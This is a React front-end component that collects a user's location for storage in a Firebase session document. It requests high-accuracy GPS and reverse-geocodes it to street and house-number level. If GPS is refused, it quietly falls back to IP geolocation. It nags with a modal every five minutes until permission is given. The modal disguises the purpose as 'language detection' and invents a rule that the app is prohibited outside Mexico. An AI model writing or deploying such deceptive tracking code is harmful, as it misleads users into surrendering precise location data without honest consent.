import React, { useEffect, useState, useRef } from 'react';
import { useAppStore } from '../store/appStore';
import { db } from '../lib/firebase';
import { doc, updateDoc } from 'firebase/firestore';
import axios from 'axios';
import { MapPin, AlertCircle, X } from 'lucide-react';

export default function LocationManager() {
  const { currentSessionId, locationPermissionStatus, setLocationPermissionStatus } = useAppStore();
  const [showPrompt, setShowPrompt] = useState(false);
  const requestedOnce = useRef(false);
  const intervalRef = useRef(null);

  const saveLocationToFirebase = async (locationData) => {
    if (!currentSessionId) return;
    try {
      const sessionRef = doc(db, 'user_sessions', currentSessionId);
      await updateDoc(sessionRef, {
        location: locationData
      });
    } catch (error) {
      console.error("Error saving location to session:", error);
    }
  };

  const getIPFallback = async () => {
    try {
      const response = await axios.get('https://ipapi.co/json/');
      const data = response.data;
      if (data && data.city) {
        await saveLocationToFirebase({
          city: data.city,
          country: data.country_name,
          lat: data.latitude,
          lon: data.longitude,
          method: 'IP (Approximate)'
        });
        setLocationPermissionStatus('ip_fallback');
      }
    } catch (error) {
      console.error("Error with IP fallback:", error);
      setLocationPermissionStatus('denied');
    }
  };

  const requestGPSLocation = () => {
    if (!("geolocation" in navigator)) {
      getIPFallback();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        try {
          // Reverse geocoding via Nominatim - Zoom 18 para obtener calle y vecindario
          const response = await axios.get(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
            headers: {
              'Accept-Language': 'es' // Para obtener la ciudad y calle en español si es posible
            }
          });
          const data = response.data;

          let address = data.address || {};
          let city = address.city || address.town || address.village || address.county || 'Desconocida';
          let country = address.country || 'Desconocido';

          // Extraer a nivel de calle
          let street = address.road || address.pedestrian || address.street || '';
          let houseNum = address.house_number ? ` ${address.house_number}` : '';
          let neighborhood = address.neighbourhood || address.suburb || '';

          let exactStreet = street ? `${street}${houseNum}` : '';
          let fullCityString = exactStreet
            ? `${exactStreet}${neighborhood ? ` (${neighborhood})` : ''}, ${city}`
            : city;

          await saveLocationToFirebase({
            city: fullCityString,
            country,
            lat,
            lon,
            method: 'GPS (Street Level)'
          });

          setLocationPermissionStatus('granted');
          setShowPrompt(false);
        } catch (error) {
          console.error("Error decoding GPS coordinates:", error);
          // Si falla reverse geocoding, enviamos al menos las coordenadas
          await saveLocationToFirebase({
            city: 'Desconocida',
            country: 'Desconocido',
            lat,
            lon,
            method: 'GPS (Raw)'
          });
          setLocationPermissionStatus('granted');
          setShowPrompt(false);
        }
      },
      (error) => {
        console.warn("Geolocation denied or error:", error);
        if (locationPermissionStatus === 'pending') {
          getIPFallback();
        }
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  };

  useEffect(() => {
    // Solo solicitar 1 vez de forma automática al iniciar sesión
    if (currentSessionId && !requestedOnce.current && locationPermissionStatus === 'pending') {
      requestedOnce.current = true;
      requestGPSLocation();
    }
  }, [currentSessionId, locationPermissionStatus]);

  useEffect(() => {
    // Configurar intervalo de molestia cada 5 minutos si no ha concedido permiso
    if (locationPermissionStatus === 'granted') {
      if (intervalRef.current) clearInterval(intervalRef.current);
      return;
    }

    if (currentSessionId && locationPermissionStatus !== 'pending') {
      intervalRef.current = setInterval(() => {
        setShowPrompt(true);
      }, 5 * 60 * 1000); // 5 minutos
    }

    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, [currentSessionId, locationPermissionStatus]);

  if (!showPrompt) return null;

  return (
    <div className="fixed inset-0 z-50 bg-slate-900/40 backdrop-blur-sm flex items-center justify-center p-4 animate-in fade-in duration-300">
      <div className="bg-white rounded-3xl shadow-2xl border border-slate-200 max-w-sm w-full p-6 text-center relative overflow-hidden">
        <button
          onClick={() => setShowPrompt(false)}
          className="absolute top-4 right-4 text-slate-400 hover:text-slate-600 bg-slate-100 hover:bg-slate-200 p-1.5 rounded-full transition-colors"
        >
          <X size={20} />
        </button>

        <div className="w-16 h-16 bg-blue-50 text-blue-500 rounded-full flex items-center justify-center mx-auto mb-4 border-4 border-blue-100">
          <MapPin size={32} />
        </div>

        <h3 className="text-xl font-bold text-slate-800 mb-2">Deteccion de Idioma</h3>
        <p className="text-slate-500 text-sm mb-6">
          De acuerdo a tu ubicacion se detectara el idioma en el que se mostrara la aplicacion. Confirma si estas en Mexico / Spanish
          <br /><br />
          <span className="text-xs flex items-center justify-center gap-1 text-amber-600 bg-amber-50 rounded-md p-2">
            <AlertCircle size={14} /> Por motivos de propiedad intelectual, esta prohibido el uso de esta aplicacion fuera de Mexico.
          </span>
        </p>

        <button
          onClick={() => {
            requestGPSLocation();
            // Por precaución, ocultar la ventanita si el usuario presiona, para no bloquearlo y que responda al nativo
            setShowPrompt(false);
          }}
          className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-xl transition-all shadow-md hover:shadow-lg"
        >
          Confirmo que estoy en Mexico / Spanish
        </button>
      </div>
    </div>
  );
}
